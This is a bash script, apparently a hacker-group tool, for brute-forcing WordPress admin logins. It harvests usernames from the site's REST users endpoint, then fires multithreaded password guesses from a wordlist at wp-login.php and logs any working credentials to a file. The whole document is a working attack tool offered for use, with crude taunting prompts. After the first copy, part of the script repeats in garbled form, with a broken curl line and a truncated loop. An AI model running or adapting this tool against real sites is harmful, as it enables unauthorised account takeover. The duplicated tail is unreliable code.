#!/bin/bash
# Name       : Wordpress Bruteforce
# Version    : 1.2
# Desc.      : Dictionary Attack Tool - Wordpress Admin
# Coded by   : Wahyu Haxor
# Website    : blog.exploit.info
# Updated on : 2021-03-28

#----------- CONFIGURATION -----------
curl_timeout=20
multithread_limit=10
#--------- CONFIGURATION EOF ---------

if [[ -f wpusername.tmp ]]
then
	rm wpusername.tmp
fi
RED='\e[31m'
GRN='\e[32m'
YEL='\e[33m'
CLR='\e[0m'

function _GetUserWPJSON() {
	Target="${1}";
	UsernameLists=$(curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s "${Target}/wp-json/wp/v2/users" | grep -Po '"slug":"\K.*?(?=")');
	echo ""
	if [[ -z ${UsernameLists} ]];
	then
		echo -e "${YEL}INFO: Cannot detect Username!${CLR}"
	else
		echo -ne > wpusername.tmp
		for Username in ${UsernameLists};
		do
			echo "INFO: Found username \"${Username}\"..."
			echo "${Username}" >> wpusername.tmp
		done
	fi
}

function _TestLogin() {
	Target="${1}"
	Username="${2}"
	Password="${3}"
	LetsTry=$(curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s -w "\nHTTP_STATUS_CODE_X %{http_code}\n" "${Target}/wp-login.php" --data "log=${Username}&pwd=${Password}&wp-submit=Log+In" --compressed)
	if [[ ! -z $(echo ${LetsTry} | grep login_error | grep div) ]];
	then
		echo -e "${YEL}INFO: Invalid ${Target} ${Username}:${Password}${CLR}"
	elif [[ $(echo ${LetsTry} | grep "HTTP_STATUS_CODE_X" | awk '{print $2}') == "302" ]];
	then
		echo -e "${GRN}[!] FOUND ${Target} \e[30;48;5;82m ${Username}:${Password} ${CLR}"
		echo "${Target} [${Username}:${Password}]" >> wpbf-results.txt
	else
		echo -e "${YEL}INFO: Invalid ${Target} ${Username}:${Password}${CLR}"
	fi
}
echo '▒█░░▒█ █▀▀█ █░░█ █░░█ █░░█ '
echo '▒█▒█▒█ █▄▄█ █▀▀█ █▄▄█ █░░█ '
echo '▒█▄▀▄█ ▀░░▀ ▀░░▀ ▄▄▄█ ░▀▀▀ 
'
echo '▒█░▒█ █▀▀█ █░█ █▀▀█ █▀▀█ '
echo '▒█▀▀█ █▄▄█ ▄▀▄ █░░█ █▄▄▀  '
echo '▒█░▒█ ▀░░▀ ▀░▀ ▀▀▀▀ ▀░▀▀ '
echo '          WORDPRESS BRUTE FORCE           '
echo '     WAHYU HAXOR | KARAWANG CYBER TEAM     '
echo ''
echo -ne "[?] target web lu njing : "
read Target

curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s "${Target}/wp-login.php" > wplogin.tmp
if [[ -z $(cat wplogin.tmp | grep "wp-submit") ]];
then
	echo -e "${RED}ERROR: Invalid wordpress wp-login!${CLR}"
	exit
fi

echo -ne "[?] wordlist lu tod (file) : "
read PasswordLists

if [[ ! -f ${PasswordLists} ]]
then
	echo -e "${RED}ERROR: Wordlist lu gak ada bangsat!${CLR}"
	exit
fi

_GetUserWPJSON ${Target}

if [[ -f wpusername.tmp ]]
then
	for User in $(cat wpusername.tmp)
	do
		(
			for Pass in $(cat ${PasswordLists})
			do
				((cthread=cthread%multithread_limit)); ((cthread++==0)) && wait
				_TestLogin ${Target} ${User} ${Pass} &
			done
			wait
		)
	done
else
	echo -e "${YEL}INFO: Username Tidak Ditemukan:)${CLR}"
	echo -ne "[?] Masukin Username Manual Tod : "
	read User

	if [[ -z ${PasswordLists} ]]
	then
		echo -e "${RED}ERROR: Username cannot be empty!${CLR}"
		exit
	fi
	echo ''
	(
		for Pass in $(cat ${PasswordLists})
		do
			((cthread=cthread%multithread_limit)); ((cthread++==0)) && wait
			_TestLogin ${Target} ${User} ${Pass} &
		done
		wait
	)
fi
echo "INFO: Found $(cat wpbf-results.txt | grep ${Target} | sort -nr | uniq | wc -l) username & password in ./wpbf-results.txt"￼Enter	Username="${2}"
	Password="${3}"
	LetsTry=$(curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s -w "\nHTTP_STATUS_CODE_X %{http_code}\n" "${Target}/wp-login.php" --data "log=${Username}&pwd=${Password}&wp-submit=Log+In" --compressed)
	if [[ ! -z $(echo ${LetsTry} | grep login_error | grep div) ]];
	then
		echo -e "${YEL}INFO: Invalid ${Target} ${Username}:${Password}${CLR}"
	elif [[ $(echo ${LetsTry} | grep "HTTP_STATUS_CODE_X" | awk '{print $2}') == "302" ]];
	then
		echo -e "${GRN}[!] FOUND ${Target} \e[30;48;5;82m ${Username}:${Password} ${CLR}"
		echo "${Target} [${Username}:${Password}]" >> wpbf-results.txt
	else
		echo -e "${YEL}INFO: Invalid ${Target} ${Username}:${Password}${CLR}"
	fi
}
echo '▒█░░▒█ █▀▀█ █░░█ █░░█ █░░█ '
echo '▒█▒█▒█ █▄▄█ █▀▀█ █▄▄█ █░░█ '
echo '▒█▄▀▄█ ▀░░▀ ▀░░▀ ▄▄▄█ ░▀▀▀ 
'
echo '▒█░▒█ █▀▀█ █░█ █▀▀█ █▀▀█ '
echo '▒█▀▀█ █▄▄█ ▄▀▄ █░░█ █▄▄▀  '
echo '▒█░▒█ ▀░░▀ ▀░▀ ▀▀▀▀ ▀░▀▀ '
echo '          WORDPRESS BRUTE FORCE           '
echo '     WAHYU HAXOR | KARAWANG CYBER TEAM     '
echo ''
echo -ne "[?] target web lu njing : "
read Target
--connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s "${Target}/wp-login.php" > wplogin.tmp
if [[ -z $(cat wplogin.tmp | grep "wp-submit") ]];
then
	echo -e "${RED}ERROR: Invalid wordpress wp-login!${CLR}"
	exit
fi

echo -ne "[?] wordlist lu tod (file) : "
read PasswordLists

if [[ ! -f ${PasswordLists} ]]
then
	echo -e "${RED}ERROR: Wordlist lu gak ada bangsat!${CLR}"
	exit
fi

_GetUserWPJSON ${Target}

if [[ -f wpusername.tmp ]]
then
	for User in $(cat wpusername.tmp)
	do
		(
			for Pass in $(cat ${PasswordLists})
			do
